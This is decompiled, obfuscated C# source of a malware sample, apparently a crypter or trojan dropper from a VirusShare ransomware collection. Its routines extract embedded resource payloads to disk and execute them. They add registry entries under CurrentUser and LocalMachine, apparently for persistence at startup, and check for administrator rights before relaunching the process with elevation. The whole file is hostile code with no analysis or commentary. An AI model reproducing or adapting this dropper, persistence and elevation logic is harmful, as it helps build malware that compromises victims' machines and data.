// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Crypter, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B731B599-442F-4A0A-B652-36FDF3199CF1
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.MSIL.Zapchast.ctbt-4d7f60f5f9cd63e753868459d0468b2925cdad0dc9dd53f889e662aa428efebf.exe

using \u0007;
using \u000F;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace \u0006
{
  internal static class \u0001
  {
    private static bool \u0001;
    private static bool \u0002;
    [NonSerialized]
    internal static GetString \u0017;

    public static void \u0001([In] bool obj0, [In] string obj1, [In] string obj2, [In] bool obj3)
    {
      RegistryKey registryKey1;
      try
      {
        try
        {
          registryKey1 = (RegistryKey) null;
          registryKey1 = !obj3 ? global::\u0001.\u007E\u0001((object) Registry.CurrentUser, \u0006.\u0001.\u0017(84), true) : global::\u0001.\u007E\u0001((object) Registry.LocalMachine, \u0006.\u0001.\u0017(84), true);
          if (obj0)
            \u0002.\u007E\u0002((object) registryKey1, obj1, (object) obj2);
          else
            \u0003.\u007E\u0003((object) registryKey1, obj1, false);
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        RegistryKey registryKey2 = registryKey1;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local1 = (ValueType) obj0;
        string str1 = obj1;
        string str2 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local2 = (ValueType) obj3;
        \u0003.\u0001(ex, (object) registryKey2, (object) local1, (object) str1, (object) str2, (object) local2);
        throw;
      }
    }

    public static void \u0001(
      [In] bool obj0,
      [In] bool obj1,
      [In] bool obj2,
      [In] string obj3,
      [In] string obj4,
      [In] string obj5,
      [In] string obj6,
      [In] string obj7,
      [In] string obj8)
    {
      string[] strArray;
      string str1;
      string baseName;
      string str2;
      ResourceManager resourceManager1;
      byte[] numArray;
      try
      {
        try
        {
          str2 = \u0005.\u0007(\u0004.\u0004(obj5), \u0006.\u0001.\u0017(145), obj6);
          str1 = \u0006.\u0001.\u0017(150);
          if (global::\u0006.\u0008(obj6, \u0006.\u0001.\u0017(150)))
          {
            strArray = new string[5]
            {
              \u0004.\u0004(obj5),
              \u0006.\u0001.\u0017(145),
              obj6,
              \u0006.\u0001.\u0017(145),
              obj7
            };
            str1 = global::\u0007.\u000F(strArray);
          }
          else
            str1 = \u0005.\u0007(\u0004.\u0004(obj5), \u0006.\u0001.\u0017(145), obj7);
          baseName = \u0006.\u0001.\u0017(151);
          DirectoryInfo directoryInfo = \u0008.\u0010(str2);
          baseName = \u000E.\u0011(baseName, \u0006.\u0001.\u0017(156));
          baseName = \u000E.\u0011(baseName, \u0006.\u0001.\u0017(161));
          resourceManager1 = new ResourceManager(baseName, global::\u000F.\u0013());
          if (true)
          {
            ResourceManager resourceManager2 = new ResourceManager(baseName, global::\u000F.\u0013());
            numArray = (byte[]) \u0010.\u007E\u0014((object) resourceManager1, obj8);
            \u0011.\u0015(str1, numArray);
            if (obj1)
              \u0006.\u0001.\u0001(true, obj3, str1, false);
            if (obj2)
              \u0006.\u0001.\u0001(true, obj4, str1, true);
            if (!obj0)
              return;
          }
          Process process = \u0012.\u0016(str1);
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[15]
        {
          (object) str2,
          (object) str1,
          (object) baseName,
          (object) resourceManager1,
          (object) numArray,
          (object) strArray,
          (object) obj0,
          (object) obj1,
          (object) obj2,
          (object) obj3,
          (object) obj4,
          (object) obj5,
          (object) obj6,
          (object) obj7,
          (object) obj8
        };
        \u0003.\u0001(ex, objArray);
        throw;
      }
    }

    private static void \u0001()
    {
      try
      {
        if (!\u0001.\u0006.\u0001())
          return;
        if (\u0006.\u0001.\u0001)
          goto label_8;
label_3:
        try
        {
          \u0006.\u0001.\u0001(true, false, false, \u0006.\u0001.\u0017(166), \u0006.\u0001.\u0017(166), \u0006.\u0001.\u0017(171), \u0006.\u0001.\u0017(150), \u0006.\u0001.\u0017(180), \u0006.\u0001.\u0017(197));
          \u0006.\u0001.\u0001(true, false, false, \u0006.\u0001.\u0017(166), \u0006.\u0001.\u0017(166), \u0006.\u0001.\u0017(171), \u0006.\u0001.\u0017(150), \u0006.\u0001.\u0017(202), \u0006.\u0001.\u0017(219));
        }
        catch
        {
        }
        if (!\u0006.\u0001.\u0002)
          return;
        \u0006.\u0001.\u0002();
        return;
label_8:
        \u0006.\u0001.\u0003();
        goto label_3;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[0];
        \u0004.\u0001(ex, objArray);
      }
    }

    internal static bool \u0001()
    {
      WindowsPrincipal windowsPrincipal1;
      bool flag;
      try
      {
        windowsPrincipal1 = new WindowsPrincipal(\u0013.\u0017());
        flag = \u0014.\u007E\u0018((object) windowsPrincipal1, WindowsBuiltInRole.Administrator);
      }
      catch (Exception ex)
      {
        WindowsPrincipal windowsPrincipal2 = windowsPrincipal1;
        \u0003.\u0001(ex, (object) windowsPrincipal2);
        throw;
      }
      return flag;
    }

    private static void \u0002()
    {
      RegistryKey registryKey1;
      RegistryKey registryKey2;
      try
      {
        try
        {
          try
          {
            registryKey1 = global::\u0001.\u007E\u0001((object) Registry.CurrentUser, \u0006.\u0001.\u0017(224), true);
            \u0002 obj = \u0002.\u007E\u0002;
            RegistryKey registryKey3 = registryKey1;
            string str1 = \u0006.\u0001.\u0017(301);
            string str2 = \u0006.\u0001.\u0017(197);
            if (true)
              goto label_2;
label_1:
            \u0015.\u007E\u0019((object) registryKey1);
            goto label_4;
label_2:
            obj((object) registryKey3, str1, (object) str2);
            goto label_1;
          }
          catch
          {
          }
label_4:
          registryKey2 = global::\u0001.\u007E\u0001((object) Registry.LocalMachine, \u0006.\u0001.\u0017(224), true);
          \u0002.\u007E\u0002((object) registryKey2, \u0006.\u0001.\u0017(301), (object) \u0006.\u0001.\u0017(197));
          \u0015.\u007E\u0019((object) registryKey2);
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        RegistryKey registryKey4 = registryKey1;
        RegistryKey registryKey5 = registryKey2;
        \u0003.\u0001(ex, (object) registryKey4, (object) registryKey5);
        throw;
      }
    }

    private static void \u0003()
    {
      ProcessStartInfo processStartInfo1;
      Process process1;
      try
      {
        if (true)
          goto label_10;
label_1:
        if (true)
        {
          if (true)
            \u0018.\u007E\u008F((object) processStartInfo1, \u0017.\u008D());
          else
            goto label_8;
        }
        \u0018.\u007E\u0090((object) processStartInfo1, \u0017.\u008E());
        \u0018.\u007E\u0091((object) processStartInfo1, \u0006.\u0001.\u0017(314));
        try
        {
          do
          {
            Process process2 = \u0019.\u0097(processStartInfo1);
          }
          while (false);
        }
        catch
        {
          return;
        }
        process1 = \u001A.\u0098();
label_8:
        \u0015.\u007E\u001A((object) process1);
        return;
label_10:
        if (\u0006.\u0001.\u0001())
          return;
        processStartInfo1 = new ProcessStartInfo();
        \u0016.\u007E\u008A((object) processStartInfo1, true);
        goto label_1;
      }
      catch (Exception ex)
      {
        ProcessStartInfo processStartInfo2 = processStartInfo1;
        Process process3 = process1;
        \u0003.\u0001(ex, (object) processStartInfo2, (object) process3);
        throw;
      }
    }

    static \u0001() => Strings.CreateGetStringDelegate(typeof (\u0006.\u0001));
  }
}
